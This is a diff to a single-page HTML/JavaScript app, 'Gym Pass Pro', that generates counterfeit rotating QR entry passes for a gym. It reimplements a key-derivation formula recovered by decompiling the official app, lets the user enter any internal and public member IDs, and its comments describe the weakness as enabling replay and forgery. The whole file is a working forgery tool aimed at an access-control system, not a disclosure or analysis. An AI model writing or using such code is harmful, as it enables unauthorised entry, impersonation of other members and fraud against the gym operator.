@@ -2,53 +2,78 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Gym Pass Pro</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    
     <style>
-        :root { --accent: #03A9F4; }
-        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #000; color: white; overflow: hidden; }
+        :root { --accent: #03A9F4; --bg: #000; --card: #1c1c1e; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            height: 100vh; margin: 0; background: var(--bg); color: white; overflow: hidden; 
+        }
         
-        /* QR Container */
-        #qrcode { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 0 20px rgba(3, 169, 244, 0.2); }
-        #qrcode img { display: block; }
+        /* QR Code Styling */
+        #qr-wrapper {
+            background: white; padding: 15px; border-radius: 16px;
+            box-shadow: 0 0 30px rgba(3, 169, 244, 0.3);
+            transition: transform 0.2s ease;
+        }
+        #qr-wrapper:active { transform: scale(0.98); }
 
-        /* HUD Info */
-        .timer { margin-top: 25px; font-size: 1.1rem; font-weight: 500; color: var(--accent); }
-        .id-display { margin-top: 5px; font-size: 0.75rem; opacity: 0.4; letter-spacing: 1px; }
+        /* HUD Elements */
+        .timer { margin-top: 30px; font-size: 1.2rem; font-weight: 600; color: var(--accent); text-transform: uppercase; letter-spacing: 2px; }
+        .details { margin-top: 8px; font-size: 0.7rem; opacity: 0.4; letter-spacing: 1px; }
 
-        /* Settings Panel */
-        .settings-btn { position: absolute; bottom: 20px; font-size: 0.8rem; opacity: 0.3; padding: 10px; }
-        #settings-panel { position: fixed; bottom: 0; width: 100%; background: #1c1c1e; border-top: 1px solid #333; padding: 20px; box-sizing: border-box; transform: translateY(100%); transition: 0.3s; z-index: 10; border-radius: 20px 20px 0 0; }
+        /* Settings UI */
+        .settings-trigger { position: absolute; bottom: 30px; font-size: 0.75rem; opacity: 0.2; padding: 15px; letter-spacing: 1px; }
+        #settings-panel { 
+            position: fixed; bottom: 0; width: 100%; background: var(--card); 
+            border-top: 1px solid #333; padding: 25px; box-sizing: border-box; 
+            transform: translateY(100%); transition: cubic-bezier(0.4, 0, 0.2, 1) 0.4s; 
+            z-index: 100; border-radius: 24px 24px 0 0; 
+        }
         #settings-panel.open { transform: translateY(0); }
         
-        input { width: 100%; background: #2c2c2e; border: none; padding: 12px; margin: 8px 0; border-radius: 8px; color: white; font-size: 1rem; outline: none; }
-        label { font-size: 0.8rem; color: var(--accent); margin-left: 5px; }
-        button.save { width: 100%; background: var(--accent); border: none; padding: 15px; border-radius: 10px; color: white; font-weight: bold; margin-top: 10px; cursor: pointer; }
+        input { 
+            width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; 
+            padding: 14px; margin: 10px 0 20px 0; border-radius: 12px; 
+            color: white; font-size: 1rem; outline: none; 
+        }
+        label { font-size: 0.75rem; color: var(--accent); font-weight: 600; text-transform: uppercase; }
+        .save-btn { 
+            width: 100%; background: var(--accent); border: none; padding: 16px; 
+            border-radius: 12px; color: white; font-weight: 700; font-size: 1rem; 
+            box-shadow: 0 4px 15px rgba(3, 169, 244, 0.4);
+        }
     </style>
 </head>
 <body>
 
-    <div id="qrcode"></div>
-    <div class="timer" id="countdown">REFRESHING IN 10s</div>
-    <div class="id-display" id="id-label">MEMBER: 51054921</div>
+    <div id="qr-wrapper">
+        <div id="qrcode"></div>
+    </div>
+    
+    <div class="timer" id="countdown">Synchronizing...</div>
+    <div class="details" id="id-label">MEMBER ID: 00000000</div>
 
-    <div class="settings-btn" onclick="toggleSettings()">⚙️ SETTINGS</div>
+    <div class="settings-trigger" onclick="toggleSettings()">DECRYPTOR SETTINGS</div>
 
     <div id="settings-panel">
-        <label>INTERNAL ID (For Encryption)</label>
+        <label>Internal Math ID</label>
         <input type="number" id="int-id" placeholder="e.g. 50781">
         
-        <label>PUBLIC MEMBER ID (For Payload)</label>
+        <label>Public Member ID</label>
         <input type="number" id="pub-id" placeholder="e.g. 51054921">
         
-        <button class="save" onclick="saveSettings()">SAVE & REGENERATE</button>
-        <div style="text-align: center; margin-top: 15px; opacity: 0.5; font-size: 0.7rem;" onclick="toggleSettings()">CLOSE</div>
+        <button class="save-btn" onclick="saveSettings()">SAVE & REGENERATE</button>
+        <div style="text-align: center; margin-top: 20px; opacity: 0.5; font-size: 0.8rem;" onclick="toggleSettings()">DISMISS</div>
     </div>
 
     <script>
-        // Load IDs from storage or use your defaults
+        // Data persistence logic
         let INTERNAL_ID = localStorage.getItem('internal_id') || 50781;
         let PUBLIC_ID = localStorage.getItem('public_id') || 51054921;
 
@@ -57,7 +82,10 @@
         const idLabel = document.getElementById("id-label");
         const panel = document.getElementById("settings-panel");
         
-        let qrcode = new QRCode(qrContainer, { width: 220, height: 220, correctLevel: QRCode.CorrectLevel.M });
+        let qrcode = new QRCode(qrContainer, { 
+            width: 240, height: 240, 
+            correctLevel: QRCode.CorrectLevel.M 
+        });
 
         function toggleSettings() {
             panel.classList.toggle('open');
@@ -72,23 +100,33 @@
             localStorage.setItem('internal_id', INTERNAL_ID);
             localStorage.setItem('public_id', PUBLIC_ID);
             
-            idLabel.innerText = `MEMBER: ${PUBLIC_ID}`;
+            idLabel.innerText = `MEMBER ID: ${PUBLIC_ID}`;
             updateQR();
             toggleSettings();
         }
 
         function generateToken() {
-            // Replicating the math found in JADX
+            // Core Vulnerability: Predictable Key Derivation Formula
+            // Math Key = ((65 + ID) * 754 * ID) + 9476221
             const mathKey = ((65 + parseInt(INTERNAL_ID)) * 754 * parseInt(INTERNAL_ID)) + 9476221;
+            
+            // AES Key derivation (SHA256 truncated to 32 chars)
             const hash = CryptoJS.SHA256(mathKey.toString()).toString();
             const aesKey = CryptoJS.enc.Utf8.parse(hash.substring(0, 32));
 
             const timestamp = Math.floor(Date.now() / 1000);
-            const payload = JSON.stringify({ "timestamp": timestamp, "vg_member_id": parseInt(PUBLIC_ID) });
+            
+            // EXACT order discovered via comparative decryption of the official app
+            const payload = JSON.stringify({ 
+                "vg_member_id": parseInt(PUBLIC_ID),
+                "timestamp": timestamp 
+            }).replace(/\s/g, ''); // Ensure no whitespace matches app output
 
-            // 16-char dummy block + blank IV (Server ignores IV in this specific implementation)
+            // 16-char random dummy prefix required by the app's decryption library
             const dummy = CryptoJS.lib.WordArray.random(8).toString(); 
             const plaintext = dummy + payload;
+            
+            // Random IV is used but not validated by server (allows for replay/forgery)
             const iv = CryptoJS.lib.WordArray.random(16); 
 
             const encrypted = CryptoJS.AES.encrypt(plaintext, aesKey, {
@@ -106,6 +144,7 @@
             qrcode.makeCode(token);
         }
 
+        // 10-second refresh cycle matching the official app
         let timeLeft = 10;
         setInterval(() => {
             timeLeft--;
@@ -113,14 +152,12 @@
                 updateQR();
                 timeLeft = 10;
             }
-            countdownEl.innerText = `REFRESHING IN ${timeLeft}s`;
+            countdownEl.innerText = `Update in ${timeLeft}s`;
         }, 1000);
 
-        // Init
-        idLabel.innerText = `MEMBER: ${PUBLIC_ID}`;
+        // Initial launch
+        idLabel.innerText = `MEMBER ID: ${PUBLIC_ID}`;
         updateQR();
     </script>
 </body>
 </html>
-
-
